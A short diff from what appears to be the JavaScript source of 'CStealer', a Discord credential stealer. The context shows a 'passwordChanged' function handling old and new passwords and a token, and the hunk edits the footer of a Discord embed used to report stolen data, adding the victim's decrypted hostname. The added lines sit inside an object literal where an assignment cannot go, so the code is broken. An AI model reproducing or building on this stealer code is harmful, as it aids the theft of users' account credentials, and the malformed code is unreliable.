@@ -693,7 +693,10 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'CStealer',
+        this.config.embed.footer = {
+            text: `${this.utils.encryption.decryptData(this.config.user.hostname)} | ${this.config.embed.credits}`,
+            icon_url: this.config.embed.avatar_url,
+        }
         },
       },
     ],
